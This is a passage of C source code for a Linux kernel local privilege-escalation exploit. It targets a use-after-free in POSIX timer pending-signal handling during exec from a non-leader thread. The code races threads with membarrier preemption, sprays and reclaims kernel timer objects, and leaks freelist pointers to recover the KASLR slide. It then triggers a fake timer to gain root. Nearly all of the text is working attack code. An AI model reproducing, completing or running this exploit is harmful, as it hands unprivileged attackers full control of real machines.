	memset(&sev, 0, sizeof(sev));
	sev.sigev_notify = SIGEV_SIGNAL | SIGEV_THREAD_ID;
	sev.sigev_signo = timer_signal;
	sev.sigev_value.sival_int = tag;
	sev._sigev_un._tid = tid;
	if (syscall(SYS_timer_create, CLOCK_MONOTONIC, &sev, &id))
		return -1;
	return id;
}

static int ktimer_arm_abs(int id, int64_t expiry)
{
	struct itimerspec its;

	memset(&its, 0, sizeof(its));
	its.it_value = ns_to_ts(expiry);
	return syscall(SYS_timer_settime, id, TIMER_ABSTIME, &its, NULL);
}

static int run_preempt_train(void *opaque)
{
	struct preempt_train_args args =
		*(const struct preempt_train_args *)opaque;
	int64_t next_sentinel = 0;
	int64_t train_end;
	int failures = 0;
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(args.source_cpu % online_cpus, &set);
	if (sched_setaffinity(0, sizeof(set), &set))
		failures++;

	if (args.source_cpu == 2) {
		while (mono_ns() < args.target - 500000)
			asm volatile("pause" ::: "memory");
		while (!syscall(SYS_tgkill, old_leader_tid, args.worker_tid, 0))
			asm volatile("pause" ::: "memory");
		if (errno != ESRCH)
			failures++;
		__atomic_store_n(&preempt_gate, 1, __ATOMIC_RELEASE);
	} else {
		while (!__atomic_load_n(&preempt_gate, __ATOMIC_ACQUIRE))
			asm volatile("pause" ::: "memory");
	}

	train_end = mono_ns() + 5000000;
	if (args.source_cpu == 3)
		next_sentinel = mono_ns();
	while (mono_ns() < train_end) {
		if (args.source_cpu == 3 && mono_ns() >= next_sentinel) {
			siginfo_t info;

			memset(&info, 0, sizeof(info));
			info.si_signo = sentinel_signal;
			info.si_code = SI_QUEUE;
			info.si_pid = (pid_t)syscall(SYS_getpid);
			info.si_uid = getuid();
			info.si_value.sival_int = SENTINEL_TAG;
			if (syscall(SYS_rt_tgsigqueueinfo, old_leader_tid,
				    old_leader_tid, sentinel_signal, &info) &&
			    errno != ESRCH)
				failures++;
			next_sentinel += SENTINEL_INTERVAL_NS;
		}
		if (syscall(SYS_membarrier, args.command, args.flags,
			    args.cpu_id))
			failures++;
	}
	return failures ? 1 : 0;
}

static int start_preempt_train(int64_t target, pid_t worker_tid)
{
	void *exit_watcher_stack;
	void *sentinel_sender_stack;
	pid_t exit_watcher_pid;
	pid_t sentinel_sender_pid;

	if (syscall(SYS_membarrier,
		    MEMBARRIER_CMD_REGISTER_PRIVATE_EXPEDITED_RSEQ, 0, 0)) {
		return -1;
	}
	exit_watcher_stack =
		mmap(NULL, PREEMPT_STACK_SIZE, PROT_READ | PROT_WRITE,
		     MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
	sentinel_sender_stack =
		mmap(NULL, PREEMPT_STACK_SIZE, PROT_READ | PROT_WRITE,
		     MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
	if (exit_watcher_stack == MAP_FAILED ||
	    sentinel_sender_stack == MAP_FAILED) {
		return -1;
	}

	preempt_gate = 0;
	memset(&exit_watcher_args, 0, sizeof(exit_watcher_args));
	exit_watcher_args.target = target;
	exit_watcher_args.cpu_id = CALLBACK_CPU;
	exit_watcher_args.command = MEMBARRIER_CMD_PRIVATE_EXPEDITED_RSEQ;
	exit_watcher_args.flags = MEMBARRIER_CMD_FLAG_CPU;
	exit_watcher_args.source_cpu = 2;
	exit_watcher_args.worker_tid = worker_tid;
	sentinel_sender_args = exit_watcher_args;
	sentinel_sender_args.source_cpu = 3;

	exit_watcher_pid =
		clone(run_preempt_train,
		      (char *)exit_watcher_stack + PREEMPT_STACK_SIZE,
		      CLONE_VM | SIGCHLD, &exit_watcher_args);
	sentinel_sender_pid =
		clone(run_preempt_train,
		      (char *)sentinel_sender_stack + PREEMPT_STACK_SIZE,
		      CLONE_VM | SIGCHLD, &sentinel_sender_args);
	if (exit_watcher_pid < 0 || sentinel_sender_pid < 0) {
		return -1;
	}
	return 0;
}

static void *exec_worker(void *unused)
{
	char *argv[] = { (char *)"poc", NULL };
	char spec[96];
	int64_t target;
	int *ids;
	int made = 0;
	int end;
	pid_t worker_tid;

	(void)unused;
	pin_cpu(1);

	signal(SIGCHLD, SIG_IGN);
	usleep(20000);

	ids = calloc((size_t)TIMER_SPRAY_COUNT, sizeof(*ids));
	if (!ids) {
		_exit(2);
	}
	for (int i = 0; i < TIMER_SPRAY_COUNT; i++) {
		ids[i] = ktimer_create_for_tid(old_leader_tid,
					       0x28000000 | (i & 0x00ffffff));
		if (ids[i] < 0 || ktimer_arm_abs(ids[i], 1))
			break;
		made++;
	}
	if (made < 1024)
		_exit(2);

	usleep(5000);

	target = mono_ns() + 150000000LL;
	worker_tid = (pid_t)syscall(SYS_gettid);
	if (start_preempt_train(target, worker_tid))
		_exit(3);
	for (int i = 0; i < made; i++) {
		if (ktimer_arm_abs(ids[i], target + 2000000000LL))
			_exit(2);
	}

	end = CALLBACK_TIMER_LIMIT < made ? CALLBACK_TIMER_LIMIT : made;
	end -= end % CALLBACK_GROUP_SIZE;
	pin_cpu(CALLBACK_CPU);
	for (int k = 0; k < end; k++) {
		int64_t expiry = target + CALLBACK_DELAY_NS +
				 (int64_t)(k / CALLBACK_GROUP_SIZE) *
					 CALLBACK_GROUP_GAP_NS;

		if (ktimer_arm_abs(ids[k], expiry))
			_exit(2);
	}

	pin_cpu(0);
	snprintf(spec, sizeof(spec), "%d %d %d %d %u", made, probe_ready_fd,
		 probe_ack_fd, notify_fd, reclaim_delay_us);
	if (setenv(POST_EXEC_ENV, spec, 1)) {
		_exit(2);
	}
	if (mono_ns() >= target - EXEC_LEAD_NS)
		_exit(3);
	while (mono_ns() < target - EXEC_LEAD_NS)
		asm volatile("pause" ::: "memory");

	syscall(SYS_execveat, exe_fd, "", argv, environ, AT_EMPTY_PATH);
	execv("/proc/thread-self/exe", argv);
	_exit(2);
}

static __attribute__((noreturn)) void run_one_attempt(void)
{
	pthread_t exec_thread;

	old_leader_tid = (pid_t)syscall(SYS_gettid);
	if (pthread_create(&exec_thread, NULL, exec_worker, NULL)) {
		_exit(2);
	}

	syscall(SYS_exit, 0);
	__builtin_unreachable();
}

static int post_exec(const char *spec)
{
	int made = -1;
	int ready_fd = -1;
	int ack_fd = -1;
	int local_notify = -1;
	int reclaimed = 0;
	int target_reused = 0;
	int probe_tag;
	int drained = 0;
	uint64_t stale_off = 0;
	int stale_found = 0;
	int spray_count;
	enum {
		initial_flush_count = 28 * 10,
		secondary_flush_count = 27,
		reclaim_floor = 2048,
		ordered_flush_count =
			initial_flush_count + secondary_flush_count,
		reserve_count = 512,
		flush_target_count = ordered_flush_count + reserve_count,
	};
	uint64_t encoded_freelist_link;
	uint64_t encoded_freelist_null;
	uint64_t neighbor_object_addr;
	int *drain_ids;
	int *cycle_ids = NULL;
	struct probe_reply reply;

	if (sscanf(spec, "%d %d %d %d %u", &made, &ready_fd, &ack_fd,
		   &local_notify, &reclaim_delay_us) != 5 ||
	    made < 1024 || ready_fd < 0 || ack_fd < 0)
		return 2;
	notify_fd = local_notify;
	probe_ready_fd = ready_fd;
	probe_ack_fd = ack_fd;
	ignore_exploit_interrupt_signals();

	spray_count = made + 65536;
	if (saved_sigpending_max > (rlim_t)(flush_target_count + 512)) {
		rlim_t cap = saved_sigpending_max - flush_target_count - 512;

		if (cap > (rlim_t)spray_count)
			cap = (rlim_t)spray_count;
		if (cap < (rlim_t)reclaim_floor)
			cap = (rlim_t)reclaim_floor;
		spray_count = (int)cap;
	}

	for (stale_off = 0; stale_off < SENTINEL_SCAN_LIMIT; stale_off++) {
		if (request_pending_peek(stale_off, 1, &reply) < 0)
			cleanup_and_park_on_failure("probe");
		if (reply.peek_count != 1)
			break;
		if (reply.info.si_signo == sentinel_signal &&
		    reply.info.si_code == SI_QUEUE &&
		    reply.info.si_value.sival_int == SENTINEL_TAG)
			continue;
		if (reply.info.si_signo == timer_signal &&
		    reply.info.si_code == SI_TIMER &&
		    ((unsigned int)reply.info.si_value.sival_int &
		     0xff000000U) == 0x28000000U) {
			stale_found = 1;
			break;
		}
		cleanup_and_park_on_failure("pending scan");
	}
	if (!stale_found) {
		if (reply.peek_count != 0)
			cleanup_and_park_on_failure("pending scan");
		finish_probe_protocol('D');
		return 0;
	}
	probe_tag = reply.info.si_value.sival_int;
	fprintf(stderr, "[+] race landed on timer %u\n",
		(unsigned int)probe_tag & 0x00ffffffU);

	drain_ids = calloc(512, sizeof(*drain_ids));
	post_spray_ids = calloc((size_t)spray_count, sizeof(*post_spray_ids));
	post_flush_ids = calloc(flush_target_count, sizeof(*post_flush_ids));
	if (!drain_ids || !post_spray_ids || !post_flush_ids)
		cleanup_and_park_on_failure("allocation");
	for (int i = 0; i < 512; i++) {
		drain_ids[i] = ktimer_create_for_tid((pid_t)syscall(SYS_gettid),
						     0x50000000 | i);
		if (drain_ids[i] < 0)
			break;
		drained++;
	}
	for (int i = 0; i < drained; i++)
		(void)syscall(SYS_timer_delete, drain_ids[i]);
	free(drain_ids);
	usleep(500000);
	if (request_pending_peek(stale_off, 1, &reply) < 0 ||
	    reply.peek_count != 1)
		cleanup_and_park_on_failure("encoded freelist link");
	encoded_freelist_link = siginfo_word(&reply.info, 16);

	for (int i = 0; i < spray_count; i++) {
		int tag = 0x51000000 | (i & 0x00ffffff);

		post_spray_ids[i] =
			ktimer_create_for_tid((pid_t)syscall(SYS_gettid), tag);
		if (post_spray_ids[i] < 0)
			break;
		post_spray_count = ++reclaimed;
		if (!(reclaimed & 127) && !target_reused) {
			if (request_pending_peek(stale_off, 1, &reply) < 0)
				cleanup_and_park_on_failure("reclaim scan");
			probe_tag = reply.info.si_value.sival_int;
			if (reply.peek_count == 1 &&
			    reply.info.si_signo == timer_signal &&
			    reply.info.si_code == SI_TIMER &&
			    ((unsigned int)probe_tag & 0xff000000U) ==
				    0x51000000U)
				target_reused = 1;
		}
		if (target_reused && reclaimed >= reclaim_floor)
			break;
	}

	if (request_pending_peek(stale_off, 1, &reply) < 0)
		cleanup_and_park_on_failure("reclaim probe");
	probe_tag = reply.info.si_value.sival_int;
	if (reply.peek_count != 1 || reply.info.si_signo != timer_signal ||
	    reply.info.si_code != SI_TIMER ||
	    ((unsigned int)probe_tag & 0xff000000U) != 0x51000000U) {
		cleanup_and_park_on_failure("reclaim");
	}

	unsigned int reclaimed_index = (unsigned int)probe_tag & 0x00ffffffU;

	if (reclaimed_index >= (unsigned int)reclaimed)
		cleanup_and_park_on_failure("reclaim index");
	fprintf(stderr, "[+] target reclaimed after %d timers\n", reclaimed);
	for (int i = 0; i < flush_target_count; i++) {
		post_flush_ids[i] = ktimer_create_for_tid(
			(pid_t)syscall(SYS_gettid), 0x52000000 | i);
		if (post_flush_ids[i] < 0)
			break;
		post_flush_count++;
	}
	if (post_flush_count != flush_target_count)
		cleanup_and_park_on_failure("initial timer fillers");

	if (request_parent_action('W', 0, 0, &reply) < 0 || reply.aio_status) {
		cleanup_and_park_on_failure("prewarm");
	}

	for (int i = 0; i < initial_flush_count; i++) {
		(void)syscall(SYS_timer_delete, post_flush_ids[i]);
		post_flush_ids[i] = -1;
	}
	usleep(750000);
	(void)syscall(SYS_timer_delete, post_spray_ids[reclaimed_index]);
	post_spray_ids[reclaimed_index] = -1;
	for (int i = initial_flush_count; i < ordered_flush_count; i++) {
		(void)syscall(SYS_timer_delete, post_flush_ids[i]);
		post_flush_ids[i] = -1;
	}
	usleep(750000);
	if (request_pending_peek(stale_off, 1, &reply) < 0 ||
	    reply.peek_count != 1)
		cleanup_and_park_on_failure("encoded freelist null");
	encoded_freelist_null = siginfo_word(&reply.info, 16);
	neighbor_object_addr = encoded_freelist_link ^ encoded_freelist_null;
	if ((neighbor_object_addr >> 48) != 0xffff ||
	    (neighbor_object_addr & 0x1fffULL) % 0x180 ||
	    (neighbor_object_addr & 0x1fffULL) / 0x180 > 20)
		cleanup_and_park_on_failure("geometry");

	enum { core_radius = 32, guard_band = 384 };
	int core_first = reclaimed_index > core_radius ?
				 (int)reclaimed_index - core_radius :
				 0;
	int core_last = reclaimed_index + core_radius + 1 <
					(unsigned int)reclaimed ?
				(int)reclaimed_index + core_radius + 1 :
				reclaimed;
	int guard_first = core_first > guard_band ? core_first - guard_band : 0;
	int guard_last = core_last + guard_band;

	for (int i = 0; i < reclaimed; i++) {
		if (i >= guard_first && i < guard_last)
			continue;
		if (post_spray_ids[i] < 0)
			continue;
		(void)syscall(SYS_timer_delete, post_spray_ids[i]);
		post_spray_ids[i] = -1;
	}

	for (int i = core_first; i < core_last; i++) {
		if (post_spray_ids[i] < 0)
			continue;
		(void)syscall(SYS_timer_delete, post_spray_ids[i]);
		post_spray_ids[i] = -1;
	}

	for (int i = ordered_flush_count; i < post_flush_count; i++) {
		(void)syscall(SYS_timer_delete, post_flush_ids[i]);
		post_flush_ids[i] = -1;
	}
	usleep(reclaim_delay_us);
	for (int attempt = 0;; attempt++) {
		if (request_parent_action('A',
					  neighbor_object_addr & ~0x1fffULL,
					  stale_off, &reply) < 0)
			cleanup_and_park_on_failure("page reclaim");
		if (!reply.aio_status)
			break;
		if (attempt >= AIO_RECLAIM_RETRIES)
			cleanup_and_park_on_failure("page reclaim");

		int cycled = 0;

		if (!cycle_ids) {
			cycle_ids =
				calloc((size_t)reclaimed, sizeof(*cycle_ids));
			if (!cycle_ids)
				cleanup_and_park_on_failure("page reclaim");
		}
		for (int i = 0; i < reclaimed; i++) {
			cycle_ids[i] = ktimer_create_for_tid(
				(pid_t)syscall(SYS_gettid), 0x53000000 | i);
			if (cycle_ids[i] < 0)
				break;
			cycled++;
		}
		for (int i = 0; i < cycled; i++)
			(void)syscall(SYS_timer_delete, cycle_ids[i]);
		if (cycled < 1024)
			cleanup_and_park_on_failure("page reclaim");
		usleep(reclaim_delay_us);
	}
	fprintf(stderr, "[+] kaslr slide %#llx (%s slot %d)\n",
		(unsigned long long)reply.kaslr_slide,
		reply.stale_slot > 10 ? "high" : "low", reply.stale_slot);
	finish_probe_protocol('S');
	close(ready_fd);
	close(ack_fd);
	probe_ready_fd = -1;
	probe_ack_fd = -1;
	trigger_fake_timer_and_finish();
}

static __attribute__((noreturn)) void park_controller(void)
{
	(void)prctl(PR_SET_NAME, "sigqueue-hold", 0, 0, 0);

	ignore_exploit_interrupt_signals();
	(void)setsid();
	for (;;)
		pause();
}

static int run_controller_attempts(void)
{
	struct probe_reply reply;

	pin_cpu(0);
	for (int attempt_index = 0; attempt_index < ATTEMPTS_PER_CONTROLLER;
	     attempt_index++) {
		int ready_pipe[2];
		int ack_pipe[2];
		pid_t child;
		int status;

		if (pipe(ready_pipe) || pipe(ack_pipe)) {
			perror("pipe");
			break;
		}
		child = fork();
		if (child < 0) {
			perror("fork");
			break;
		}
		if (!child) {
			close(ready_pipe[0]);
			close(ack_pipe[1]);
			probe_ready_fd = ready_pipe[1];
			probe_ack_fd = ack_pipe[0];
			run_one_attempt();
		}
		close(ready_pipe[1]);
		close(ack_pipe[0]);
		for (;;) {
			int probe = ptrace_probe_child(child, ready_pipe[0],
						       ack_pipe[1], &reply);

			if (probe == 2)
				park_controller();
			if (probe == 1 || probe < 0)
				break;
		}
		close(ready_pipe[0]);
		close(ack_pipe[1]);
		(void)waitpid(child, &status, 0);
	}
	notify_controller('E');
	return 0;
}

static int run_timing_window(int run_number)
{
	int64_t deadline = mono_ns() + TIMING_RUN_TIMEOUT_NS;

	reclaim_delay_us =
		reclaim_delay_table_us[(run_number - 1) %
				       (int)(sizeof(reclaim_delay_table_us) /
					     sizeof(reclaim_delay_table_us[0]))];
	int notify_pipe[2];
	pid_t controller;
	int rooted = 0;
	int done = 0;
	int landed = 0;

	if (pipe(notify_pipe)) {
		perror("pipe");
		return -1;
	}
	notify_fd = notify_pipe[1];
	controller = fork();
	if (controller < 0) {
		perror("fork");
		close(notify_pipe[0]);
		close(notify_pipe[1]);
		return -1;
	}
	if (!controller) {
		close(notify_pipe[0]);
		_exit(run_controller_attempts());
	}
	for (;;) {
		struct pollfd pfd = {
			.fd = notify_pipe[0],
			.events = POLLIN,
		};
		char code;
		int ready = poll(&pfd, 1, 500);

		if (ready > 0 && (pfd.revents & POLLIN)) {
			if (read(notify_pipe[0], &code, 1) != 1)
				continue;
			if (code == 'R') {
				rooted = 1;
				continue;
			}
			if (code == 'X') {
				done = 1;
				break;
			}
			if (!rooted) {
				landed = code == 'F';
				break;
			}
			continue;
		}
		if (rooted)
			continue;
		if (ready < 0 && errno != EINTR)
			break;
		if (!ready) {
			int status;

			if (waitpid(controller, &status, WNOHANG) ==
			    controller) {
				controller = -1;
				break;
			}
			if (mono_ns() > deadline)
				break;
		}
	}

	if (controller > 0 && !rooted) {
		(void)kill(controller, SIGKILL);
		(void)waitpid(controller, NULL, 0);
	}
	while (waitpid(-1, NULL, WNOHANG) > 0)
		;
	close(notify_pipe[0]);
	close(notify_pipe[1]);
	notify_fd = -1;
	return done ? 1 : (landed ? 2 : 0);
}

int main(void)
{
	struct rlimit limit;
	sigset_t blocked;
	long cpus;

	timer_signal = SIGRTMIN + 6;
	sentinel_signal = SIGRTMIN + 7;
	cpus = sysconf(_SC_NPROCESSORS_ONLN);
	online_cpus = cpus > 0 ? (int)cpus : 1;
	if (!getrlimit(RLIMIT_SIGPENDING, &limit))
		saved_sigpending_max = limit.rlim_max;

	{
		const char *spec = getenv(POST_EXEC_ENV);

		if (spec) {
			char post_exec_spec[96];

			snprintf(post_exec_spec, sizeof(post_exec_spec), "%s",
				 spec);
			unsetenv(POST_EXEC_ENV);
			return post_exec(post_exec_spec);
		}
	}

	setvbuf(stderr, NULL, _IONBF, 0);
	signal(SIGPIPE, SIG_IGN);
	limit.rlim_cur = limit.rlim_max;
	(void)setrlimit(RLIMIT_SIGPENDING, &limit);

	sigemptyset(&blocked);
	sigaddset(&blocked, timer_signal);
	sigaddset(&blocked, sentinel_signal);
	if (pthread_sigmask(SIG_BLOCK, &blocked, NULL)) {
		perror("pthread_sigmask");
		return 2;
	}
	exe_fd = open("/proc/self/exe", O_RDONLY | O_CLOEXEC);
	if (exe_fd < 0) {
		perror("open /proc/self/exe");
		return 2;
	}

	fprintf(stderr,
		"[*] POSIX timer / nonleader exec pending-list UAF (uid=%d)\n",
		getuid());
	if (online_cpus < 4)
		fprintf(stderr,
			"[!] %d online CPUs; the race needs 4 to be reliable\n",
			online_cpus);

	for (int run_number = 1; run_number <= MAX_TIMING_RUNS; run_number++) {
		int outcome = run_timing_window(run_number);

		if (outcome == 1)
			return 0;
		if (outcome < 0)
			return 2;
		usleep(500000);
	}
	fprintf(stderr, "[-] exploit did not succeed\n");
	return 1;
}
